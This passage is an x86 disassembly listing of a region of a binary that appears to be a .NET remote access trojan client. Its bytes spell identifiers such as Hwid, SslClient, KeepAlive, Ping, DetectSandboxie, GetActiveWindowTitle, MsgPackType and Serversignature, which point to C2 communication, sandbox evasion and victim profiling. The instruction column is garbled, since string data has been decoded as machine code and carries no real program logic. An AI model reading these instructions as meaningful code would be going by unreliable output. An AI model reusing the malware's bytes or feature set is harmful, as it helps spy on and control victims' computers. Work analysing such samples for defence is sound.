  407b85:	00 52 65             	add    %dl,0x65(%edx)
  407b88:	63 65 69             	arpl   %esp,0x69(%ebp)
  407b8b:	76 65                	jbe    0x407bf2
  407b8d:	64 00 67 65          	add    %ah,%fs:0x65(%edi)
  407b91:	74 5f                	je     0x407bf2
  407b93:	47                   	inc    %edi
  407b94:	75 69                	jne    0x407bff
  407b96:	64 00 48 77          	add    %cl,%fs:0x77(%eax)
  407b9a:	69 64 00 3c 53 65 6e 	imul   $0x646e6553,0x3c(%eax,%eax,1),%esp
  407ba1:	64 
  407ba2:	53                   	push   %ebx
  407ba3:	79 6e                	jns    0x407c13
  407ba5:	63 3e                	arpl   %edi,(%esi)
  407ba7:	6b 5f 5f 42          	imul   $0x42,0x5f(%edi),%ebx
  407bab:	61                   	popa
  407bac:	63 6b 69             	arpl   %ebp,0x69(%ebx)
  407baf:	6e                   	outsb  %ds:(%esi),(%dx)
  407bb0:	67 46                	addr16 inc %esi
  407bb2:	69 65 6c 64 00 3c 49 	imul   $0x493c0064,0x6c(%ebp),%esp
  407bb9:	73 43                	jae    0x407bfe
  407bbb:	6f                   	outsl  %ds:(%esi),(%dx)
  407bbc:	6e                   	outsb  %ds:(%esi),(%dx)
  407bbd:	6e                   	outsb  %ds:(%esi),(%dx)
  407bbe:	65 63 74 65 64       	arpl   %esi,%gs:0x64(%ebp,%eiz,2)
  407bc3:	3e 6b 5f 5f 42       	imul   $0x42,%ds:0x5f(%edi),%ebx
  407bc8:	61                   	popa
  407bc9:	63 6b 69             	arpl   %ebp,0x69(%ebx)
  407bcc:	6e                   	outsb  %ds:(%esi),(%dx)
  407bcd:	67 46                	addr16 inc %esi
  407bcf:	69 65 6c 64 00 3c 4b 	imul   $0x4b3c0064,0x6c(%ebp),%esp
  407bd6:	65 65 70 41          	gs gs jo 0x407c1b
  407bda:	6c                   	insb   (%dx),%es:(%edi)
  407bdb:	69 76 65 3e 6b 5f 5f 	imul   $0x5f5f6b3e,0x65(%esi),%esi
  407be2:	42                   	inc    %edx
  407be3:	61                   	popa
  407be4:	63 6b 69             	arpl   %ebp,0x69(%ebx)
  407be7:	6e                   	outsb  %ds:(%esi),(%dx)
  407be8:	67 46                	addr16 inc %esi
  407bea:	69 65 6c 64 00 3c 48 	imul   $0x483c0064,0x6c(%ebp),%esp
  407bf1:	65 61                	gs popa
  407bf3:	64 65 72 53          	fs gs jb 0x407c4a
  407bf7:	69 7a 65 3e 6b 5f 5f 	imul   $0x5f5f6b3e,0x65(%edx),%edi
  407bfe:	42                   	inc    %edx
  407bff:	61                   	popa
  407c00:	63 6b 69             	arpl   %ebp,0x69(%ebx)
  407c03:	6e                   	outsb  %ds:(%esi),(%dx)
  407c04:	67 46                	addr16 inc %esi
  407c06:	69 65 6c 64 00 3c 50 	imul   $0x503c0064,0x6c(%ebp),%esp
  407c0d:	69 6e 67 3e 6b 5f 5f 	imul   $0x5f5f6b3e,0x67(%esi),%ebp
  407c14:	42                   	inc    %edx
  407c15:	61                   	popa
  407c16:	63 6b 69             	arpl   %ebp,0x69(%ebx)
  407c19:	6e                   	outsb  %ds:(%esi),(%dx)
  407c1a:	67 46                	addr16 inc %esi
  407c1c:	69 65 6c 64 00 3c 41 	imul   $0x413c0064,0x6c(%ebp),%esp
  407c23:	63 74 69 76          	arpl   %esi,0x76(%ecx,%ebp,2)
  407c27:	61                   	popa
  407c28:	74 65                	je     0x407c8f
  407c2a:	50                   	push   %eax
  407c2b:	6f                   	outsl  %ds:(%esi),(%dx)
  407c2c:	6e                   	outsb  %ds:(%esi),(%dx)
  407c2d:	67 3e 6b 5f 5f 42    	imul   $0x42,%ds:0x5f(%bx),%ebx
  407c33:	61                   	popa
  407c34:	63 6b 69             	arpl   %ebp,0x69(%ebx)
  407c37:	6e                   	outsb  %ds:(%esi),(%dx)
  407c38:	67 46                	addr16 inc %esi
  407c3a:	69 65 6c 64 00 3c 49 	imul   $0x493c0064,0x6c(%ebp),%esp
  407c41:	6e                   	outsb  %ds:(%esi),(%dx)
  407c42:	74 65                	je     0x407ca9
  407c44:	72 76                	jb     0x407cbc
  407c46:	61                   	popa
  407c47:	6c                   	insb   (%dx),%es:(%edi)
  407c48:	3e 6b 5f 5f 42       	imul   $0x42,%ds:0x5f(%edi),%ebx
  407c4d:	61                   	popa
  407c4e:	63 6b 69             	arpl   %ebp,0x69(%ebx)
  407c51:	6e                   	outsb  %ds:(%esi),(%dx)
  407c52:	67 46                	addr16 inc %esi
  407c54:	69 65 6c 64 00 3c 42 	imul   $0x423c0064,0x6c(%ebp),%esp
  407c5b:	75 66                	jne    0x407cc3
  407c5d:	66 65 72 3e          	data16 gs jb 0x407c9f
  407c61:	6b 5f 5f 42          	imul   $0x42,0x5f(%edi),%ebx
  407c65:	61                   	popa
  407c66:	63 6b 69             	arpl   %ebp,0x69(%ebx)
  407c69:	6e                   	outsb  %ds:(%esi),(%dx)
  407c6a:	67 46                	addr16 inc %esi
  407c6c:	69 65 6c 64 00 3c 4f 	imul   $0x4f3c0064,0x6c(%ebp),%esp
  407c73:	66 66 73 65          	data16 data16 jae 0x407cdc
  407c77:	74 3e                	je     0x407cb7
  407c79:	6b 5f 5f 42          	imul   $0x42,0x5f(%edi),%ebx
  407c7d:	61                   	popa
  407c7e:	63 6b 69             	arpl   %ebp,0x69(%ebx)
  407c81:	6e                   	outsb  %ds:(%esi),(%dx)
  407c82:	67 46                	addr16 inc %esi
  407c84:	69 65 6c 64 00 3c 53 	imul   $0x533c0064,0x6c(%ebp),%esp
  407c8b:	73 6c                	jae    0x407cf9
  407c8d:	43                   	inc    %ebx
  407c8e:	6c                   	insb   (%dx),%es:(%edi)
  407c8f:	69 65 6e 74 3e 6b 5f 	imul   $0x5f6b3e74,0x6e(%ebp),%esp
  407c96:	5f                   	pop    %edi
  407c97:	42                   	inc    %edx
  407c98:	61                   	popa
  407c99:	63 6b 69             	arpl   %ebp,0x69(%ebx)
  407c9c:	6e                   	outsb  %ds:(%esi),(%dx)
  407c9d:	67 46                	addr16 inc %esi
  407c9f:	69 65 6c 64 00 3c 54 	imul   $0x543c0064,0x6c(%ebp),%esp
  407ca6:	63 70 43             	arpl   %esi,0x43(%eax)
  407ca9:	6c                   	insb   (%dx),%es:(%edi)
  407caa:	69 65 6e 74 3e 6b 5f 	imul   $0x5f6b3e74,0x6e(%ebp),%esp
  407cb1:	5f                   	pop    %edi
  407cb2:	42                   	inc    %edx
  407cb3:	61                   	popa
  407cb4:	63 6b 69             	arpl   %ebp,0x69(%ebx)
  407cb7:	6e                   	outsb  %ds:(%esi),(%dx)
  407cb8:	67 46                	addr16 inc %esi
  407cba:	69 65 6c 64 00 49 6e 	imul   $0x6e490064,0x6c(%ebp),%esp
  407cc1:	6e                   	outsb  %ds:(%esi),(%dx)
  407cc2:	65 72 41             	gs jb  0x407d06
  407cc5:	64 64 4d             	fs fs dec %ebp
  407cc8:	61                   	popa
  407cc9:	70 43                	jo     0x407d0e
  407ccb:	68 69 6c 64 00       	push   $0x646c69
  407cd0:	49                   	dec    %ecx
  407cd1:	6e                   	outsb  %ds:(%esi),(%dx)
  407cd2:	6e                   	outsb  %ds:(%esi),(%dx)
  407cd3:	65 72 41             	gs jb  0x407d17
  407cd6:	64 64 41             	fs fs inc %ecx
  407cd9:	72 72                	jb     0x407d4d
  407cdb:	61                   	popa
  407cdc:	79 43                	jns    0x407d21
  407cde:	68 69 6c 64 00       	push   $0x646c69
  407ce3:	68 57 6e 64 00       	push   $0x646e57
  407ce8:	53                   	push   %ebx
  407ce9:	65 6e                	outsb  %gs:(%esi),(%dx)
  407ceb:	64 00 41 70          	add    %al,%fs:0x70(%ecx)
  407cef:	70 65                	jo     0x407d56
  407cf1:	6e                   	outsb  %ds:(%esi),(%dx)
  407cf2:	64 00 52 65          	add    %dl,%fs:0x65(%edx)
  407cf6:	67 69 73 74 72 79 56 	imul   $0x61567972,0x74(%bp,%di),%esi
  407cfd:	61 
  407cfe:	6c                   	insb   (%dx),%es:(%edi)
  407cff:	75 65                	jne    0x407d66
  407d01:	4b                   	dec    %ebx
  407d02:	69 6e 64 00 52 65 70 	imul   $0x70655200,0x64(%esi),%ebp
  407d09:	6c                   	insb   (%dx),%es:(%edi)
  407d0a:	61                   	popa
  407d0b:	63 65 00             	arpl   %esp,0x0(%ebp)
  407d0e:	43                   	inc    %ebx
  407d0f:	72 65                	jb     0x407d76
  407d11:	61                   	popa
  407d12:	74 65                	je     0x407d79
  407d14:	49                   	dec    %ecx
  407d15:	6e                   	outsb  %ds:(%esi),(%dx)
  407d16:	73 74                	jae    0x407d8c
  407d18:	61                   	popa
  407d19:	6e                   	outsb  %ds:(%esi),(%dx)
  407d1a:	63 65 00             	arpl   %esp,0x0(%ebp)
  407d1d:	73 65                	jae    0x407d84
  407d1f:	74 5f                	je     0x407d80
  407d21:	4d                   	dec    %ebp
  407d22:	6f                   	outsl  %ds:(%esi),(%dx)
  407d23:	64 65 00 46 69       	fs add %al,%gs:0x69(%esi)
  407d28:	6c                   	insb   (%dx),%es:(%edi)
  407d29:	65 4d                	gs dec %ebp
  407d2b:	6f                   	outsl  %ds:(%esi),(%dx)
  407d2c:	64 65 00 50 61       	fs add %dl,%gs:0x61(%eax)
  407d31:	64 64 69 6e 67 4d 6f 	fs imul $0x65646f4d,%fs:0x67(%esi),%ebp
  407d38:	64 65 
  407d3a:	00 45 6e             	add    %al,0x6e(%ebp)
  407d3d:	74 65                	je     0x407da4
  407d3f:	72 44                	jb     0x407d85
  407d41:	65 62 75 67          	bound  %esi,%gs:0x67(%ebp)
  407d45:	4d                   	dec    %ebp
  407d46:	6f                   	outsl  %ds:(%esi),(%dx)
  407d47:	64 65 00 43 72       	fs add %al,%gs:0x72(%ebx)
  407d4c:	79 70                	jns    0x407dbe
  407d4e:	74 6f                	je     0x407dbf
  407d50:	53                   	push   %ebx
  407d51:	74 72                	je     0x407dc5
  407d53:	65 61                	gs popa
  407d55:	6d                   	insl   (%dx),%es:(%edi)
  407d56:	4d                   	dec    %ebp
  407d57:	6f                   	outsl  %ds:(%esi),(%dx)
  407d58:	64 65 00 43 6f       	fs add %al,%gs:0x6f(%ebx)
  407d5d:	6d                   	insl   (%dx),%es:(%edi)
  407d5e:	70 72                	jo     0x407dd2
  407d60:	65 73 73             	gs jae 0x407dd6
  407d63:	69 6f 6e 4d 6f 64 65 	imul   $0x65646f4d,0x6e(%edi),%ebp
  407d6a:	00 43 69             	add    %al,0x69(%ebx)
  407d6d:	70 68                	jo     0x407dd7
  407d6f:	65 72 4d             	gs jb  0x407dbf
  407d72:	6f                   	outsl  %ds:(%esi),(%dx)
  407d73:	64 65 00 53 65       	fs add %dl,%gs:0x65(%ebx)
  407d78:	6c                   	insb   (%dx),%es:(%edi)
  407d79:	65 63 74 4d 6f       	arpl   %esi,%gs:0x6f(%ebp,%ecx,2)
  407d7e:	64 65 00 75 74       	fs add %dh,%gs:0x74(%ebp)
  407d83:	66 38 45 6e          	data16 cmp %al,0x6e(%ebp)
  407d87:	63 6f 64             	arpl   %ebp,0x64(%edi)
  407d8a:	65 00 44 65 6c       	add    %al,%gs:0x6c(%ebp,%eiz,2)
  407d8f:	65 74 65             	gs je  0x407df7
  407d92:	53                   	push   %ebx
  407d93:	75 62                	jne    0x407df7
  407d95:	4b                   	dec    %ebx
  407d96:	65 79 54             	gs jns 0x407ded
  407d99:	72 65                	jb     0x407e00
  407d9b:	65 00 67 65          	add    %ah,%gs:0x65(%edi)
  407d9f:	74 5f                	je     0x407e00
  407da1:	4d                   	dec    %ebp
  407da2:	65 73 73             	gs jae 0x407e18
  407da5:	61                   	popa
  407da6:	67 65 00 44 65       	add    %al,%gs:0x65(%si)
  407dab:	74 65                	je     0x407e12
  407dad:	63 74 53 61          	arpl   %esi,0x61(%ebx,%edx,2)
  407db1:	6e                   	outsb  %ds:(%esi),(%dx)
  407db2:	64 62 6f 78          	bound  %ebp,%fs:0x78(%edi)
  407db6:	69 65 00 49 6e 76 6f 	imul   $0x6f766e49,0x0(%ebp),%esp
  407dbd:	6b 65 00 49          	imul   $0x49,0x0(%ebp),%esp
  407dc1:	45                   	inc    %ebp
  407dc2:	6e                   	outsb  %ds:(%esi),(%dx)
  407dc3:	75 6d                	jne    0x407e32
  407dc5:	65 72 61             	gs jb  0x407e29
  407dc8:	62 6c 65 00          	bound  %ebp,0x0(%ebp,%eiz,2)
  407dcc:	49                   	dec    %ecx
  407dcd:	44                   	inc    %esp
  407dce:	69 73 70 6f 73 61 62 	imul   $0x6261736f,0x70(%ebx),%esi
  407dd5:	6c                   	insb   (%dx),%es:(%edi)
  407dd6:	65 00 54 6f 44       	add    %dl,%gs:0x44(%edi,%ebp,2)
  407ddb:	6f                   	outsl  %ds:(%esi),(%dx)
  407ddc:	75 62                	jne    0x407e40
  407dde:	6c                   	insb   (%dx),%es:(%edi)
  407ddf:	65 00 53 77          	add    %dl,%gs:0x77(%ebx)
  407de3:	61                   	popa
  407de4:	70 44                	jo     0x407e2a
  407de6:	6f                   	outsl  %ds:(%esi),(%dx)
  407de7:	75 62                	jne    0x407e4b
  407de9:	6c                   	insb   (%dx),%es:(%edi)
  407dea:	65 00 67 65          	add    %ah,%gs:0x65(%edi)
  407dee:	74 5f                	je     0x407e4f
  407df0:	48                   	dec    %eax
  407df1:	61                   	popa
  407df2:	6e                   	outsb  %ds:(%esi),(%dx)
  407df3:	64 6c                	fs insb (%dx),%es:(%edi)
  407df5:	65 00 52 75          	add    %dl,%gs:0x75(%edx)
  407df9:	6e                   	outsb  %ds:(%esi),(%dx)
  407dfa:	74 69                	je     0x407e65
  407dfc:	6d                   	insl   (%dx),%es:(%edi)
  407dfd:	65 46                	gs inc %esi
  407dff:	69 65 6c 64 48 61 6e 	imul   $0x6e614864,0x6c(%ebp),%esp
  407e06:	64 6c                	fs insb (%dx),%es:(%edi)
  407e08:	65 00 47 65          	add    %al,%gs:0x65(%edi)
  407e0c:	74 4d                	je     0x407e5b
  407e0e:	6f                   	outsl  %ds:(%esi),(%dx)
  407e0f:	64 75 6c             	fs jne 0x407e7e
  407e12:	65 48                	gs dec %eax
  407e14:	61                   	popa
  407e15:	6e                   	outsb  %ds:(%esi),(%dx)
  407e16:	64 6c                	fs insb (%dx),%es:(%edi)
  407e18:	65 00 52 75          	add    %dl,%gs:0x75(%edx)
  407e1c:	6e                   	outsb  %ds:(%esi),(%dx)
  407e1d:	74 69                	je     0x407e88
  407e1f:	6d                   	insl   (%dx),%es:(%edi)
  407e20:	65 54                	gs push %esp
  407e22:	79 70                	jns    0x407e94
  407e24:	65 48                	gs dec %eax
  407e26:	61                   	popa
  407e27:	6e                   	outsb  %ds:(%esi),(%dx)
  407e28:	64 6c                	fs insb (%dx),%es:(%edi)
  407e2a:	65 00 47 65          	add    %al,%gs:0x65(%edi)
  407e2e:	74 54                	je     0x407e84
  407e30:	79 70                	jns    0x407ea2
  407e32:	65 46                	gs inc %esi
  407e34:	72 6f                	jb     0x407ea5
  407e36:	6d                   	insl   (%dx),%es:(%edi)
  407e37:	48                   	dec    %eax
  407e38:	61                   	popa
  407e39:	6e                   	outsb  %ds:(%esi),(%dx)
  407e3a:	64 6c                	fs insb (%dx),%es:(%edi)
  407e3c:	65 00 57 61          	add    %dl,%gs:0x61(%edi)
  407e40:	69 74 48 61 6e 64 6c 	imul   $0x656c646e,0x61(%eax,%ecx,2),%esi
  407e47:	65 
  407e48:	00 57 72             	add    %dl,0x72(%edi)
  407e4b:	69 74 65 53 69 6e 67 	imul   $0x6c676e69,0x53(%ebp,%eiz,2),%esi
  407e52:	6c 
  407e53:	65 00 54 6f 53       	add    %dl,%gs:0x53(%edi,%ebp,2)
  407e58:	69 6e 67 6c 65 00 53 	imul   $0x5300656c,0x67(%esi),%ebp
  407e5f:	65 74 41             	gs je  0x407ea3
  407e62:	73 53                	jae    0x407eb7
  407e64:	69 6e 67 6c 65 00 49 	imul   $0x4900656c,0x67(%esi),%ebp
  407e6b:	6e                   	outsb  %ds:(%esi),(%dx)
  407e6c:	73 74                	jae    0x407ee2
  407e6e:	61                   	popa
  407e6f:	6c                   	insb   (%dx),%es:(%edi)
  407e70:	6c                   	insb   (%dx),%es:(%edi)
  407e71:	46                   	inc    %esi
  407e72:	69 6c 65 00 44 65 63 	imul   $0x6f636544,0x0(%ebp,%eiz,2),%ebp
  407e79:	6f 
  407e7a:	64 65 46             	fs gs inc %esi
  407e7d:	72 6f                	jb     0x407eee
  407e7f:	6d                   	insl   (%dx),%es:(%edi)
  407e80:	46                   	inc    %esi
  407e81:	69 6c 65 00 53 61 76 	imul   $0x65766153,0x0(%ebp,%eiz,2),%ebp
  407e88:	65 
  407e89:	42                   	inc    %edx
  407e8a:	79 74                	jns    0x407f00
  407e8c:	65 73 54             	gs jae 0x407ee3
  407e8f:	6f                   	outsl  %ds:(%esi),(%dx)
  407e90:	46                   	inc    %esi
  407e91:	69 6c 65 00 49 73 49 	imul   $0x6e497349,0x0(%ebp,%eiz,2),%ebp
  407e98:	6e 
  407e99:	52                   	push   %edx
  407e9a:	6f                   	outsl  %ds:(%esi),(%dx)
  407e9b:	6c                   	insb   (%dx),%es:(%edi)
  407e9c:	65 00 57 69          	add    %dl,%gs:0x69(%edi)
  407ea0:	6e                   	outsb  %ds:(%esi),(%dx)
  407ea1:	64 6f                	outsl  %fs:(%esi),(%dx)
  407ea3:	77 73                	ja     0x407f18
  407ea5:	42                   	inc    %edx
  407ea6:	75 69                	jne    0x407f11
  407ea8:	6c                   	insb   (%dx),%es:(%edi)
  407ea9:	74 49                	je     0x407ef4
  407eab:	6e                   	outsb  %ds:(%esi),(%dx)
  407eac:	52                   	push   %edx
  407ead:	6f                   	outsl  %ds:(%esi),(%dx)
  407eae:	6c                   	insb   (%dx),%es:(%edi)
  407eaf:	65 00 47 65          	add    %al,%gs:0x65(%edi)
  407eb3:	74 41                	je     0x407ef6
  407eb5:	63 74 69 76          	arpl   %esi,0x76(%ecx,%ebp,2)
  407eb9:	65 57                	gs push %edi
  407ebb:	69 6e 64 6f 77 54 69 	imul   $0x6954776f,0x64(%esi),%ebp
  407ec2:	74 6c                	je     0x407f30
  407ec4:	65 00 67 65          	add    %ah,%gs:0x65(%edi)
  407ec8:	74 5f                	je     0x407f29
  407eca:	4d                   	dec    %ebp
  407ecb:	61                   	popa
  407ecc:	69 6e 4d 6f 64 75 6c 	imul   $0x6c75646f,0x4d(%esi),%ebp
  407ed3:	65 00 50 72          	add    %dl,%gs:0x72(%eax)
  407ed7:	6f                   	outsl  %ds:(%esi),(%dx)
  407ed8:	63 65 73             	arpl   %esp,0x73(%ebp)
  407edb:	73 4d                	jae    0x407f2a
  407edd:	6f                   	outsl  %ds:(%esi),(%dx)
  407ede:	64 75 6c             	fs jne 0x407f4d
  407ee1:	65 00 73 65          	add    %dh,%gs:0x65(%ebx)
  407ee5:	74 5f                	je     0x407f46
  407ee7:	57                   	push   %edi
  407ee8:	69 6e 64 6f 77 53 74 	imul   $0x7453776f,0x64(%esi),%ebp
  407eef:	79 6c                	jns    0x407f5d
  407ef1:	65 00 50 72          	add    %dl,%gs:0x72(%eax)
  407ef5:	6f                   	outsl  %ds:(%esi),(%dx)
  407ef6:	63 65 73             	arpl   %esp,0x73(%ebp)
  407ef9:	73 57                	jae    0x407f52
  407efb:	69 6e 64 6f 77 53 74 	imul   $0x7453776f,0x64(%esi),%ebp
  407f02:	79 6c                	jns    0x407f70
  407f04:	65 00 67 65          	add    %ah,%gs:0x65(%edi)
  407f08:	74 5f                	je     0x407f69
  407f0a:	4e                   	dec    %esi
  407f0b:	61                   	popa
  407f0c:	6d                   	insl   (%dx),%es:(%edi)
  407f0d:	65 00 67 65          	add    %ah,%gs:0x65(%edi)
  407f11:	74 5f                	je     0x407f72
  407f13:	46                   	inc    %esi
  407f14:	69 6c 65 4e 61 6d 65 	imul   $0x656d61,0x4e(%ebp,%eiz,2),%ebp
  407f1b:	00 
  407f1c:	73 65                	jae    0x407f83
  407f1e:	74 5f                	je     0x407f7f
  407f20:	46                   	inc    %esi
  407f21:	69 6c 65 4e 61 6d 65 	imul   $0x656d61,0x4e(%ebp,%eiz,2),%ebp
  407f28:	00 
  407f29:	47                   	inc    %edi
  407f2a:	65 74 54             	gs je  0x407f81
  407f2d:	65 6d                	gs insl (%dx),%es:(%edi)
  407f2f:	70 46                	jo     0x407f77
  407f31:	69 6c 65 4e 61 6d 65 	imul   $0x656d61,0x4e(%ebp,%eiz,2),%ebp
  407f38:	00 
  407f39:	47                   	inc    %edi
  407f3a:	65 74 46             	gs je  0x407f83
  407f3d:	69 6c 65 4e 61 6d 65 	imul   $0x656d61,0x4e(%ebp,%eiz,2),%ebp
  407f44:	00 
  407f45:	66 69 6c 65 4e 61 6d 	imul   $0x6d61,0x4e(%ebp,%eiz,2),%bp
  407f4c:	65 00 6c 70 4d       	add    %ch,%gs:0x4d(%eax,%esi,2)
  407f51:	6f                   	outsl  %ds:(%esi),(%dx)
  407f52:	64 75 6c             	fs jne 0x407fc1
  407f55:	65 4e                	gs dec %esi
  407f57:	61                   	popa
  407f58:	6d                   	insl   (%dx),%es:(%edi)
  407f59:	65 00 67 65          	add    %ah,%gs:0x65(%edi)
  407f5d:	74 5f                	je     0x407fbe
  407f5f:	4d                   	dec    %ebp
  407f60:	61                   	popa
  407f61:	63 68 69             	arpl   %ebp,0x69(%eax)
  407f64:	6e                   	outsb  %ds:(%esi),(%dx)
  407f65:	65 4e                	gs dec %esi
  407f67:	61                   	popa
  407f68:	6d                   	insl   (%dx),%es:(%edi)
  407f69:	65 00 67 65          	add    %ah,%gs:0x65(%edi)
  407f6d:	74 5f                	je     0x407fce
  407f6f:	4f                   	dec    %edi
  407f70:	53                   	push   %ebx
  407f71:	46                   	inc    %esi
  407f72:	75 6c                	jne    0x407fe0
  407f74:	6c                   	insb   (%dx),%es:(%edi)
  407f75:	4e                   	dec    %esi
  407f76:	61                   	popa
  407f77:	6d                   	insl   (%dx),%es:(%edi)
  407f78:	65 00 67 65          	add    %ah,%gs:0x65(%edi)
  407f7c:	74 5f                	je     0x407fdd
  407f7e:	46                   	inc    %esi
  407f7f:	75 6c                	jne    0x407fed
  407f81:	6c                   	insb   (%dx),%es:(%edi)
  407f82:	4e                   	dec    %esi
  407f83:	61                   	popa
  407f84:	6d                   	insl   (%dx),%es:(%edi)
  407f85:	65 00 49 73          	add    %cl,%gs:0x73(%ecx)
  407f89:	56                   	push   %esi
  407f8a:	61                   	popa
  407f8b:	6c                   	insb   (%dx),%es:(%edi)
  407f8c:	69 64 44 6f 6d 61 69 	imul   $0x6e69616d,0x6f(%esp,%eax,2),%esp
  407f93:	6e 
  407f94:	4e                   	dec    %esi
  407f95:	61                   	popa
  407f96:	6d                   	insl   (%dx),%es:(%edi)
  407f97:	65 00 67 65          	add    %ah,%gs:0x65(%edi)
  407f9b:	74 5f                	je     0x407ffc
  407f9d:	55                   	push   %ebp
  407f9e:	73 65                	jae    0x408005
  407fa0:	72 4e                	jb     0x407ff0
  407fa2:	61                   	popa
  407fa3:	6d                   	insl   (%dx),%es:(%edi)
  407fa4:	65 00 6c 6f 77       	add    %ch,%gs:0x77(%edi,%ebp,2)
  407fa9:	65 72 4e             	gs jb  0x407ffa
  407fac:	61                   	popa
  407fad:	6d                   	insl   (%dx),%es:(%edi)
  407fae:	65 00 53 65          	add    %dl,%gs:0x65(%ebx)
  407fb2:	74 4e                	je     0x408002
  407fb4:	61                   	popa
  407fb5:	6d                   	insl   (%dx),%es:(%edi)
  407fb6:	65 00 43 68          	add    %al,%gs:0x68(%ebx)
  407fba:	65 63 6b 48          	arpl   %ebp,%gs:0x48(%ebx)
  407fbe:	6f                   	outsl  %ds:(%esi),(%dx)
  407fbf:	73 74                	jae    0x408035
  407fc1:	4e                   	dec    %esi
  407fc2:	61                   	popa
  407fc3:	6d                   	insl   (%dx),%es:(%edi)
  407fc4:	65 00 6e 61          	add    %ch,%gs:0x61(%esi)
  407fc8:	6d                   	insl   (%dx),%es:(%edi)
  407fc9:	65 00 44 61 74       	add    %al,%gs:0x74(%ecx,%eiz,2)
  407fce:	65 54                	gs push %esp
  407fd0:	69 6d 65 00 67 65 74 	imul   $0x74656700,0x65(%ebp),%ebp
  407fd7:	5f                   	pop    %edi
  407fd8:	4c                   	dec    %esp
  407fd9:	61                   	popa
  407fda:	73 74                	jae    0x408050
  407fdc:	57                   	push   %edi
  407fdd:	72 69                	jb     0x408048
  407fdf:	74 65                	je     0x408046
  407fe1:	54                   	push   %esp
  407fe2:	69 6d 65 00 54 6f 55 	imul   $0x556f5400,0x65(%ebp),%ebp
  407fe9:	6e                   	outsb  %ds:(%esi),(%dx)
  407fea:	69 76 65 72 73 61 6c 	imul   $0x6c617372,0x65(%esi),%esi
  407ff1:	54                   	push   %esp
  407ff2:	69 6d 65 00 57 72 69 	imul   $0x69725700,0x65(%ebp),%ebp
  407ff9:	74 65                	je     0x408060
  407ffb:	4c                   	dec    %esp
  407ffc:	69 6e 65 00 43 6f 6d 	imul   $0x6d6f4300,0x65(%esi),%ebp
  408003:	62 69 6e             	bound  %ebp,0x6e(%ecx)
  408006:	65 00 55 72          	add    %dl,%gs:0x72(%ebp)
  40800a:	69 48 6f 73 74 4e 61 	imul   $0x614e7473,0x6f(%eax),%ecx
  408011:	6d                   	insl   (%dx),%es:(%edi)
  408012:	65 54                	gs push %esp
  408014:	79 70                	jns    0x408086
  408016:	65 00 67 65          	add    %ah,%gs:0x65(%edi)
  40801a:	74 5f                	je     0x40807b
  40801c:	56                   	push   %esi
  40801d:	61                   	popa
  40801e:	6c                   	insb   (%dx),%es:(%edi)
  40801f:	75 65                	jne    0x408086
  408021:	54                   	push   %esp
  408022:	79 70                	jns    0x408094
  408024:	65 00 76 61          	add    %dh,%gs:0x61(%esi)
  408028:	6c                   	insb   (%dx),%es:(%edi)
  408029:	75 65                	jne    0x408090
  40802b:	54                   	push   %esp
  40802c:	79 70                	jns    0x40809e
  40802e:	65 00 4d 73          	add    %cl,%gs:0x73(%ebp)
  408032:	67 50                	addr16 push %eax
  408034:	61                   	popa
  408035:	63 6b 54             	arpl   %ebp,0x54(%ebx)
  408038:	79 70                	jns    0x4080aa
  40803a:	65 00 50 72          	add    %dl,%gs:0x72(%eax)
  40803e:	6f                   	outsl  %ds:(%esi),(%dx)
  40803f:	74 6f                	je     0x4080b0
  408041:	63 6f 6c             	arpl   %ebp,0x6c(%edi)
  408044:	54                   	push   %esp
  408045:	79 70                	jns    0x4080b7
  408047:	65 00 47 65          	add    %al,%gs:0x65(%edi)
  40804b:	74 54                	je     0x4080a1
  40804d:	79 70                	jns    0x4080bf
  40804f:	65 00 53 6f          	add    %dl,%gs:0x6f(%ebx)
  408053:	63 6b 65             	arpl   %ebp,0x65(%ebx)
  408056:	74 54                	je     0x4080ac
  408058:	79 70                	jns    0x4080ca
  40805a:	65 00 46 69          	add    %al,%gs:0x69(%esi)
  40805e:	6c                   	insb   (%dx),%es:(%edi)
  40805f:	65 53                	gs push %ebx
  408061:	68 61 72 65 00       	push   $0x657261
  408066:	53                   	push   %ebx
  408067:	79 73                	jns    0x4080dc
  408069:	74 65                	je     0x4080d0
  40806b:	6d                   	insl   (%dx),%es:(%edi)
  40806c:	2e 43                	cs inc %ebx
  40806e:	6f                   	outsl  %ds:(%esi),(%dx)
  40806f:	72 65                	jb     0x4080d6
  408071:	00 53 65             	add    %dl,0x65(%ebx)
  408074:	72 76                	jb     0x4080ec
  408076:	65 72 73             	gs jb  0x4080ec
  408079:	69 67 6e 61 74 75 72 	imul   $0x72757461,0x6e(%edi),%esp
  408080:	65 00 43 6c          	add    %al,%gs:0x6c(%ebx)
  408084:	6f                   	outsl  %ds:(%esi),(%dx)
  408085:	73 65                	jae    0x4080ec
  408087:	00 44 69 73          	add    %al,0x73(%ecx,%ebp,2)
  40808b:	70 6f                	jo     0x4080fc
  40808d:	73 65                	jae    0x4080f4
  40808f:	00 50 61             	add    %dl,0x61(%eax)
  408092:	72 73                	jb     0x408107
  408094:	65 00 53 74          	add    %dl,%gs:0x74(%ebx)
  408098:	72 52                	jb     0x4080ec
  40809a:	65 76 65             	gs jbe 0x408102
  40809d:	72 73                	jb     0x408112
  40809f:	65 00 58 35          	add    %bl,%gs:0x35(%eax)
  4080a3:	30 39                	xor    %bh,(%ecx)
  4080a5:	43                   	inc    %ebx
  4080a6:	65 72 74             	gs jb  0x40811d
  4080a9:	69 66 69 63 61 74 65 	imul   $0x65746163,0x69(%esi),%esp
  4080b0:	00 56 61             	add    %dl,0x61(%esi)
  4080b3:	6c                   	insb   (%dx),%es:(%edi)
  4080b4:	69 64 61 74 65 53 65 	imul   $0x72655365,0x74(%ecx,%eiz,2),%esp
  4080bb:	72 
  4080bc:	76 65                	jbe    0x408123
  4080be:	72 43                	jb     0x408103
  4080c0:	65 72 74             	gs jb  0x408137
  4080c3:	69 66 69 63 61 74 65 	imul   $0x65746163,0x69(%esi),%esp
  4080ca:	00 63 65             	add    %ah,0x65(%ebx)
  4080cd:	72 74                	jb     0x408143
  4080cf:	69 66 69 63 61 74 65 	imul   $0x65746163,0x69(%esi),%esp
  4080d6:	00 43 72             	add    %al,0x72(%ebx)
  4080d9:	65 61                	gs popa
  4080db:	74 65                	je     0x408142
  4080dd:	00 53 65             	add    %dl,0x65(%ebx)
  4080e0:	74 54                	je     0x408136
  4080e2:	68 72 65 61 64       	push   $0x64616572
  4080e7:	45                   	inc    %ebp
  4080e8:	78 65                	js     0x40814f
  4080ea:	63 75 74             	arpl   %esi,0x74(%ebp)
  4080ed:	69 6f 6e 53 74 61 74 	imul   $0x74617453,0x6e(%edi),%ebp
